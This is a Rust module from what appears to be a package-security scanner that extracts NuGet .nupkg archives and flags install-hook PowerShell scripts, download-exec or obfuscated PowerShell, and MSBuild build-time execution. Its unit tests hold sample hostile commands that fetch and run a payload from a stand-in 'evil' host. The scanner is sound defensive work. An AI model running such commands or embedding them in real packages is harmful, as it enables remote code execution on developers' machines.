//! Extract a `.nupkg` (ZIP / Open Packaging Conventions) and scan it.
//!
//! `.nupkg` is a ZIP archive. There is no shared ZIP helper in
//! `argus-fetch` (its `extract_tarball` is gzip+tar only), so the
//! path-safe extraction loop here is copied from
//! `argus-pypi/src/wheel.rs`: reject path traversal, reject symlinks, and
//! cap total extracted size.
//!
//! After extraction we walk the tree and apply:
//! - ecosystem-agnostic content rules (`argus_rules::scan_text_file`),
//! - PowerShell install-hook rules on `*.ps1`,
//! - MSBuild build-time rules on `*.targets` / `*.props`,
//! - the single root-level `*.nuspec` manifest for name + version.

use crate::{finding, rules};
use anyhow::{bail, Result};
use argus_core::{Finding, Severity};
use argus_rules::{
    read_text_file_bounded, scan_text_file, RuleSession, SkipReason, TextFileOutcome,
};
use quick_xml::events::Event;
use quick_xml::reader::Reader;
use quick_xml::XmlVersion;
use std::path::Path;

const TEXT_MAX_BYTES: u64 = 1024 * 1024;
type NupkgFileResult = (Vec<Finding>, bool, Option<(Option<String>, Option<String>)>);

/// Result of scanning an extracted `.nupkg` tree.
pub struct NupkgScan {
    pub findings: Vec<Finding>,
    pub name: Option<String>,
    pub version: Option<String>,
}

/// Extract a `.nupkg` (ZIP) into `dest_root` and scan everything.
pub fn scan_nuget_archive(
    nupkg_bytes: &[u8],
    dest_root: &Path,
    max_extracted_bytes: u64,
) -> Result<NupkgScan> {
    let rules = RuleSession::builtin()?;
    scan_nuget_archive_with_rules(nupkg_bytes, dest_root, max_extracted_bytes, &rules)
}

pub fn scan_nuget_archive_with_rules(
    nupkg_bytes: &[u8],
    dest_root: &Path,
    max_extracted_bytes: u64,
    rules: &RuleSession,
) -> Result<NupkgScan> {
    let execution = argus_core::ExecutionContext::serial()?;
    scan_nuget_archive_with_rules_and_context(
        nupkg_bytes,
        dest_root,
        max_extracted_bytes,
        rules,
        &execution,
    )
}

pub fn scan_nuget_archive_with_rules_and_context(
    nupkg_bytes: &[u8],
    dest_root: &Path,
    max_extracted_bytes: u64,
    rules: &RuleSession,
    execution: &argus_core::ExecutionContext,
) -> Result<NupkgScan> {
    argus_archive::extract_zip(nupkg_bytes, dest_root, max_extracted_bytes, ".nupkg entry")?;
    scan_extracted_nupkg_with_rules_and_context(dest_root, rules, execution)
}

/// Walk the extracted tree and apply all rules.
pub fn scan_extracted_nupkg(dest_root: &Path) -> Result<NupkgScan> {
    let rules = RuleSession::builtin()?;
    scan_extracted_nupkg_with_rules(dest_root, &rules)
}

pub fn scan_extracted_nupkg_with_rules(dest_root: &Path, rules: &RuleSession) -> Result<NupkgScan> {
    let execution = argus_core::ExecutionContext::serial()?;
    scan_extracted_nupkg_with_rules_and_context(dest_root, rules, &execution)
}

pub fn scan_extracted_nupkg_with_rules_and_context(
    dest_root: &Path,
    rules: &RuleSession,
    execution: &argus_core::ExecutionContext,
) -> Result<NupkgScan> {
    let mut findings: Vec<Finding> = Vec::new();
    let mut name: Option<String> = None;
    let mut version: Option<String> = None;
    let mut nuspec_seen = false;

    let mut inputs = Vec::new();
    for entry in walkdir::WalkDir::new(dest_root).follow_links(false) {
        let entry = entry?;
        if !entry.file_type().is_file() {
            continue;
        }
        let abs = entry.path();
        let rel = abs
            .strip_prefix(dest_root)
            .unwrap_or(abs)
            .to_string_lossy()
            .replace('\\', "/");
        let lower_rel = rel.to_ascii_lowercase();
        // STEP 1 — PATH-based classification, BEFORE the size cap.
        //
        // The NuGet trigger surface (install-hook scripts, MSBuild
        // auto-import files, the root manifest) is identified by path, not
        // content. An attacker can pad any of these past `TEXT_MAX_BYTES`
        // to evade a size-gated scan, so we flag the install-hook by name
        // here regardless of size. This is the structural signal that an
        // install/build hook is present at all.
        let is_nuspec = !rel.contains('/') && lower_rel.ends_with(".nuspec");
        let is_ps1 = lower_rel.ends_with(".ps1");
        let is_msbuild = is_msbuild_autoimport(&lower_rel);
        inputs.push((rel, abs.to_path_buf(), is_nuspec, is_ps1, is_msbuild));
    }
    inputs.sort_by(|left, right| left.0.cmp(&right.0));
    execution.execute_ordered(
        &inputs,
        None,
        |_index, (rel, abs, is_nuspec, is_ps1, is_msbuild)| -> Result<NupkgFileResult> {
            let mut per_file = Vec::new();
            if *is_ps1 {
                scan_powershell_name(rel, &mut per_file);
            }
            let file = match read_text_file_bounded(rel, abs, TEXT_MAX_BYTES)? {
                TextFileOutcome::Text(file) => file,
                // A .nuspec, install hook, or auto-imported MSBuild file we
                // never read is missing evidence, not an absent finding.
                TextFileOutcome::Skipped(reason) => {
                    if reason != SkipReason::Binary && (*is_nuspec || *is_ps1 || *is_msbuild) {
                        bail!(
                            "security-relevant NuGet file `{rel}` was not scanned ({})",
                            match reason {
                                SkipReason::Oversized => "exceeds text scan limit",
                                SkipReason::Unreadable => "could not be read",
                                SkipReason::Binary => "is not text",
                            }
                        );
                    }
                    return Ok((per_file, *is_nuspec, None));
                }
            };
            if *is_nuspec {
                let metadata = parse_nuspec_name_version(&file.content);
                scan_nuspec_structure(&file.content, rel, &mut per_file);
                return Ok((per_file, true, metadata));
            }
            scan_text_file(&file, &mut per_file);
            if *is_ps1 {
                scan_powershell_content(&file.content, rel, &mut per_file);
            }
            if *is_msbuild {
                scan_msbuild(&file.content, rel, &mut per_file);
            }
            Ok((per_file, false, None))
        },
        |_index, (mut per_file, saw_nuspec, metadata)| {
            nuspec_seen |= saw_nuspec;
            if let Some((found_name, found_version)) = metadata {
                name = name.take().or(found_name);
                version = version.take().or(found_version);
            }
            findings.append(&mut per_file);
            Ok(())
        },
    )?;

    if !nuspec_seen {
        findings.push(finding(
            "nuget-no-manifest",
            Severity::Info,
            "no root-level `.nuspec` manifest found in .nupkg".to_string(),
        ));
    }

    rules.scan_directory_with_context(dest_root, &mut findings, execution)?;
    rules.validate_external_limits(&findings)?;
    rules.normalize_findings(&mut findings);

    Ok(NupkgScan {
        findings,
        name,
        version,
    })
}

/// Returns true when a (lowercased) relative path is an MSBuild file that
/// NuGet auto-imports into the consumer build. NuGet auto-imports
/// `.targets`/`.props` from `build/`, `buildTransitive/`, AND
/// `buildMultiTargeting/` (the latter is imported when the consuming project
/// multi-targets several TFMs).
fn is_msbuild_autoimport(lower_rel: &str) -> bool {
    (lower_rel.ends_with(".targets") || lower_rel.ends_with(".props"))
        && (lower_rel.starts_with("build/")
            || lower_rel.starts_with("buildtransitive/")
            || lower_rel.starts_with("buildmultitargeting/"))
}

/// Flag install-hook scripts by canonical path. Path-only: runs before the
/// size cap so a padded `tools/install.ps1` is still surfaced.
///
/// NuGet only auto-runs install hooks (`init.ps1` / `install.ps1` /
/// `uninstall.ps1`) when they sit *directly* under the package root `tools/`
/// directory. A same-named script elsewhere (e.g. `docs/install.ps1` or
/// `contentFiles/.../install.ps1`) is never auto-executed, so it must not
/// produce this High install-hook finding. Generic PowerShell *content*
/// scanning still applies to every `.ps1` regardless of location — only the
/// install-hook *path* signal is scoped here.
fn scan_powershell_name(rel: &str, findings: &mut Vec<Finding>) {
    let lower = rel.to_ascii_lowercase();
    if matches!(
        lower.as_str(),
        "tools/init.ps1" | "tools/install.ps1" | "tools/uninstall.ps1"
    ) {
        findings.push(finding(
            "nuget-install-script",
            Severity::High,
            format!("`{rel}` is a NuGet install/uninstall PowerShell hook that runs in the Package Manager Console"),
        ));
    }
}

/// Detect dangerous PowerShell content (download-exec, obfuscation).
fn scan_powershell_content(content: &str, rel: &str, findings: &mut Vec<Finding>) {
    if rules::powershell_download_exec_regex().is_match(content) {
        findings.push(finding(
            "powershell-download-exec",
            Severity::Critical,
            format!("`{rel}` downloads and/or executes code from PowerShell"),
        ));
    }
    if rules::powershell_obfuscation_regex().is_match(content) {
        findings.push(finding(
            "powershell-obfuscation",
            Severity::High,
            format!("`{rel}` contains base64/encoded-command obfuscation markers"),
        ));
    }
}

/// Detect build-time arbitrary execution inside MSBuild integration files.
fn scan_msbuild(content: &str, rel: &str, findings: &mut Vec<Finding>) {
    if rules::msbuild_exec_task_regex().is_match(content) {
        findings.push(finding(
            "msbuild-exec-task",
            Severity::High,
            format!("`{rel}` runs a command/download/inline task on every consumer `dotnet build`"),
        ));
    }
    if rules::msbuild_inline_task_regex().is_match(content) {
        findings.push(finding(
            "msbuild-inline-task",
            Severity::High,
            format!("`{rel}` declares a `<UsingTask AssemblyFile=...>` — build-time code from a packaged assembly"),
        ));
    }
}

/// Structural nuspec signals: `<contentFiles>` / `<files>` mappings that
/// auto-include into the consumer project. Info-only (structural).
fn scan_nuspec_structure(content: &str, rel: &str, findings: &mut Vec<Finding>) {
    let lower = content.to_ascii_lowercase();
    if lower.contains("<contentfiles") || lower.contains("<files") {
        findings.push(finding(
            "nuget-content-files",
            Severity::Info,
            format!("`{rel}` declares contentFiles/files that map into the consumer project"),
        ));
    }
}

/// Pull `<metadata><id>` and `<metadata><version>` out of a `.nuspec`,
/// ignoring the default XML namespace. Returns best-effort (Option, Option).
fn parse_nuspec_name_version(xml: &str) -> Option<(Option<String>, Option<String>)> {
    let mut reader = Reader::from_str(xml);
    reader.config_mut().trim_text(true);

    let mut in_metadata = false;
    let mut current: Option<String> = None;
    let mut name: Option<String> = None;
    let mut version: Option<String> = None;
    let mut buf = Vec::new();

    loop {
        match reader.read_event_into(&mut buf) {
            Ok(Event::Start(e)) => {
                let local = local_name(e.name().as_ref());
                if local == "metadata" {
                    in_metadata = true;
                } else if in_metadata && (local == "id" || local == "version") {
                    current = Some(local);
                }
            }
            Ok(Event::Text(t)) => {
                if let Some(field) = current.as_deref() {
                    let text = t
                        .xml_content(XmlVersion::Implicit1_0)
                        .ok()?
                        .trim()
                        .to_string();
                    if !text.is_empty() {
                        match field {
                            "id" => name = name.or(Some(text)),
                            "version" => version = version.or(Some(text)),
                            _ => {}
                        }
                    }
                }
            }
            Ok(Event::End(e)) => {
                let local = local_name(e.name().as_ref());
                if local == "metadata" {
                    in_metadata = false;
                }
                if Some(local.as_str()) == current.as_deref() {
                    current = None;
                }
            }
            Ok(Event::Eof) => break,
            Err(_) => return None,
            _ => {}
        }
        buf.clear();
    }

    if name.is_none() && version.is_none() {
        return None;
    }
    Some((name, version))
}

/// Strip any `prefix:` from an XML element's qualified name, returning the
/// lowercased local name. NuGet nuspec uses a default namespace, so we
/// match on local names.
fn local_name(qname: &[u8]) -> String {
    let s = String::from_utf8_lossy(qname);
    let local = s.rsplit(':').next().unwrap_or(&s);
    local.to_ascii_lowercase()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_nuspec_basic() {
        let xml = r#"<?xml version="1.0"?>
<package xmlns="http://schemas.microsoft.com/packaging/2010/07/nuspec.xsd">
  <metadata>
    <id>Demo.Package</id>
    <version>1.2.3</version>
    <authors>someone</authors>
  </metadata>
</package>"#;
        let (n, v) = parse_nuspec_name_version(xml).unwrap();
        assert_eq!(n.as_deref(), Some("Demo.Package"));
        assert_eq!(v.as_deref(), Some("1.2.3"));
    }

    #[test]
    fn parse_nuspec_with_prefix() {
        let xml = r#"<nu:package xmlns:nu="x"><nu:metadata><nu:id>Foo</nu:id><nu:version>9.9</nu:version></nu:metadata></nu:package>"#;
        let (n, v) = parse_nuspec_name_version(xml).unwrap();
        assert_eq!(n.as_deref(), Some("Foo"));
        assert_eq!(v.as_deref(), Some("9.9"));
    }

    #[test]
    fn parse_nuspec_garbage_returns_none() {
        assert!(parse_nuspec_name_version("not xml at all <<<").is_none());
    }

    #[test]
    fn powershell_install_hook_flagged() {
        let mut f = Vec::new();
        scan_powershell_name("tools/install.ps1", &mut f);
        assert!(f.iter().any(|x| x.rule_id == "nuget-install-script"));
    }

    #[test]
    fn powershell_install_hook_outside_tools_not_flagged() {
        // NuGet only auto-runs install hooks placed directly under `tools/`.
        // A same-named script elsewhere must not produce the install-hook
        // finding.
        for rel in [
            "docs/install.ps1",
            "contentFiles/any/net6.0/install.ps1",
            "build/init.ps1",
            "uninstall.ps1",
            "tools/sub/install.ps1",
        ] {
            let mut f = Vec::new();
            scan_powershell_name(rel, &mut f);
            assert!(
                !f.iter().any(|x| x.rule_id == "nuget-install-script"),
                "`{rel}` must not produce nuget-install-script"
            );
        }
    }

    #[test]
    fn powershell_content_scanned_outside_tools() {
        // A malicious `.ps1` outside `tools/` still gets content-scanned even
        // though it is not an auto-run install hook.
        let mut f = Vec::new();
        scan_powershell_name("docs/install.ps1", &mut f);
        scan_powershell_content(
            "Invoke-WebRequest http://evil/x -OutFile p.exe; Start-Process p.exe",
            "docs/install.ps1",
            &mut f,
        );
        assert!(
            !f.iter().any(|x| x.rule_id == "nuget-install-script"),
            "docs/install.ps1 must not be an install-hook finding"
        );
        assert!(
            f.iter().any(|x| x.rule_id == "powershell-download-exec"),
            "content scan must still flag download-exec outside tools/"
        );
    }

    #[test]
    fn powershell_download_exec_flagged() {
        let mut f = Vec::new();
        scan_powershell_name("tools/install.ps1", &mut f);
        scan_powershell_content(
            "Invoke-WebRequest http://evil/x -OutFile p.exe; Start-Process p.exe",
            "tools/install.ps1",
            &mut f,
        );
        assert!(f.iter().any(|x| x.rule_id == "powershell-download-exec"));
        assert!(f.iter().any(|x| x.rule_id == "nuget-install-script"));
    }

    #[test]
    fn is_msbuild_autoimport_covers_buildmultitargeting() {
        assert!(is_msbuild_autoimport("buildmultitargeting/foo.targets"));
        assert!(is_msbuild_autoimport("buildmultitargeting/foo.props"));
        assert!(is_msbuild_autoimport("build/foo.targets"));
        assert!(is_msbuild_autoimport("buildtransitive/foo.props"));
        // Not auto-imported: arbitrary directory, or wrong extension.
        assert!(!is_msbuild_autoimport("content/foo.targets"));
        assert!(!is_msbuild_autoimport("buildmultitargeting/foo.txt"));
    }

    #[test]
    fn msbuild_exec_flagged() {
        let mut f = Vec::new();
        scan_msbuild(
            r#"<Project><Target><Exec Command="curl evil|sh"/></Target></Project>"#,
            "build/Foo.targets",
            &mut f,
        );
        assert!(f.iter().any(|x| x.rule_id == "msbuild-exec-task"));
    }

    #[test]
    fn msbuild_benign_not_flagged() {
        let mut f = Vec::new();
        scan_msbuild(
            r#"<Project><ItemGroup><Reference Include="System"/></ItemGroup></Project>"#,
            "build/Foo.props",
            &mut f,
        );
        assert!(f.is_empty());
    }
}
